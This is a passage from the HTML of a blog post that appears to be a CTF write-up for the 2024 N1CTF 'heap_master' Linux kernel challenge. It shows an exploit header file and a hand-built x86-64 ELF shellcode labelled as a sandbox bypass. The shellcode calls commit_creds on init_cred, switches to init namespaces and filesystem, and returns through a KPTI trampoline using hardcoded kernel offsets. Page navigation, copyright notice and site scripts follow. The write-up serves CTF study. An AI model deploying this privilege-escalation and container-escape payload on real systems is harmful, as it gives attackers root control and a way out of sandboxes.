class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Kernel.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/dma-heap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY	040000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _QWORD unsigned long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _WORD unsigned short</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ULL unsigned long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOSE printf(<span class="string">&quot;\033[0m\n&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED printf(<span class="string">&quot;\033[31m\[-] &quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN printf(<span class="string">&quot;\033[32m\[+] &quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE printf(<span class="string">&quot;\033[36m\[+] &quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW printf(<span class="string">&quot;\033[33m\[+] &quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE printf(<span class="string">&quot;\033[35m\[+] &quot;</span>);</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">;沙盒绕过shellcode</span><br><span class="line">; 执行nasm -f bin -o tiny64 tiny64.asm</span><br><span class="line">BITS 64</span><br><span class="line">  org 0x400000</span><br><span class="line"> </span><br><span class="line">ehdr:           ; Elf64_Ehdr</span><br><span class="line">  db 0x7f, &quot;ELF&quot;, 2, 1, 1, 0 ; e_ident</span><br><span class="line">  times 8 db 0</span><br><span class="line">  dw  2         ; e_type</span><br><span class="line">  dw  0x3e      ; e_machine</span><br><span class="line">  dd  1         ; e_version</span><br><span class="line">  dq  _start    ; e_entry</span><br><span class="line">  dq  phdr - $$ ; e_phoff</span><br><span class="line">  dq  0         ; e_shoff</span><br><span class="line">  dd  0         ; e_flags</span><br><span class="line">  dw  ehdrsize  ; e_ehsize</span><br><span class="line">  dw  phdrsize  ; e_phentsize</span><br><span class="line">  dw  1         ; e_phnum</span><br><span class="line">  dw  0         ; e_shentsize</span><br><span class="line">  dw  0         ; e_shnum</span><br><span class="line">  dw  0         ; e_shstrndx</span><br><span class="line">  ehdrsize  equ  $ - ehdr</span><br><span class="line"> </span><br><span class="line">phdr:           ; Elf64_Phdr</span><br><span class="line">  dd  1         ; p_type</span><br><span class="line">  dd  5         ; p_flags</span><br><span class="line">  dq  0         ; p_offset</span><br><span class="line">  dq  $$        ; p_vaddr</span><br><span class="line">  dq  $$        ; p_paddr</span><br><span class="line">  dq  filesize  ; p_filesz</span><br><span class="line">  dq  filesize  ; p_memsz</span><br><span class="line">  dq  0x1000    ; p_align</span><br><span class="line">  phdrsize  equ  $ - phdr</span><br><span class="line"> </span><br><span class="line">section .data</span><br><span class="line">  init_cred         equ 0x2a76b00</span><br><span class="line">  commit_creds      equ 0x01c2670</span><br><span class="line">  find_task_by_vpid equ 0x01b8fa0</span><br><span class="line">  init_nsproxy      equ 0x2a768c0</span><br><span class="line">  switch_task_namespaces equ 0x1c0ad0</span><br><span class="line">  init_fs                equ 0x2bb5320</span><br><span class="line">  copy_fs_struct         equ 0x45c0f0</span><br><span class="line">  kpti_bypass            equ 0x14011c6</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">  endbr64</span><br><span class="line">  call a</span><br><span class="line">a:</span><br><span class="line">  pop r15</span><br><span class="line">  sub r15, 0x42cc49</span><br><span class="line"></span><br><span class="line">  ; commit_creds(init_cred) [3]</span><br><span class="line">  lea rdi, [r15 + init_cred]</span><br><span class="line">  lea rax, [r15 + commit_creds]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; task = find_task_by_vpid(1) [4]</span><br><span class="line">  mov edi, 1</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; switch_task_namespaces(task, init_nsproxy) [5]</span><br><span class="line">  mov rdi, rax</span><br><span class="line">  lea rsi, [r15 + init_nsproxy]</span><br><span class="line">  lea rax, [r15 + switch_task_namespaces]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; new_fs = copy_fs_struct(init_fs) [6]</span><br><span class="line">  lea rdi, [r15 + init_fs]</span><br><span class="line">  lea rax, [r15 + copy_fs_struct]</span><br><span class="line">  call rax</span><br><span class="line">  mov rbx, rax</span><br><span class="line"></span><br><span class="line">  ; current = find_task_by_vpid(getpid())</span><br><span class="line">  mov rdi, 0x1111111111111111   ; will be fixed at runtime</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; current-&gt;fs = new_fs [8]</span><br><span class="line">  mov [rax + 0x828], rbx</span><br><span class="line"></span><br><span class="line">  ; kpti trampoline [9]</span><br><span class="line">  xor eax, eax</span><br><span class="line">  mov [rsp+0x00], rax</span><br><span class="line">  mov [rsp+0x08], rax</span><br><span class="line">  mov rax, 0x2222222222222222   ; win</span><br><span class="line">  mov [rsp+0x10], rax</span><br><span class="line">  mov rax, 0x3333333333333333   ; cs</span><br><span class="line">  mov [rsp+0x18], rax</span><br><span class="line">  mov rax, 0x4444444444444444   ; rflags</span><br><span class="line">  mov [rsp+0x20], rax</span><br><span class="line">  mov rax, 0x5555555555555555   ; stack</span><br><span class="line">  mov [rsp+0x28], rax</span><br><span class="line">  mov rax, 0x6666666666666666   ; ss</span><br><span class="line">  mov [rsp+0x30], rax</span><br><span class="line">  lea rax, [r15 + kpti_bypass]</span><br><span class="line">  jmp rax</span><br><span class="line"></span><br><span class="line">  int3</span><br><span class="line"></span><br><span class="line">filesize  equ  $ - $$</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2024 N1CTF heap_master题解（DirtyPage手法）</li>
+        <li><strong>Author:</strong> 0rb1t</li>
+        <li><strong>Created at
+                :</strong> 2024-11-10 20:52:10</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-11 00:05:08
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/11/10/2024-N1CTF-heap-master题解（DirtyPage手法）/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/KernelPwn/">#KernelPwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/10/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81ker%E9%A2%98%E8%A7%A3%EF%BC%88USMA%E6%89%8B%E6%B3%95%EF%BC%89/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2024强网拟态ker题解（USMA手法）</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">2024 N1CTF heap_master题解（DirtyPage手法）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">0x01.题目分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="nav-text">0x02.攻击手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cross-Cache-Attack-%E4%BA%A4%E5%8F%89%E7%BC%93%E5%AD%98%E6%94%BB%E5%87%BB"><span class="nav-text">Cross-Cache Attack 交叉缓存攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTE%E5%8A%AB%E6%8C%81"><span class="nav-text">PTE劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8dup%E5%AE%9E%E7%8E%B0uaf-file%E7%9A%84%E4%BF%AE%E6%94%B9"><span class="nav-text">利用dup实现uaf_file的修改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DMA-BUF-Heap%E7%94%B3%E8%AF%B7pte%E9%82%BB%E8%BF%91%E5%86%85%E5%AD%98"><span class="nav-text">DMA-BUF Heap申请pte邻近内存</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">0x03.漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-EXP"><span class="nav-text">0x04.EXP</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">0rb1t</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        10 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
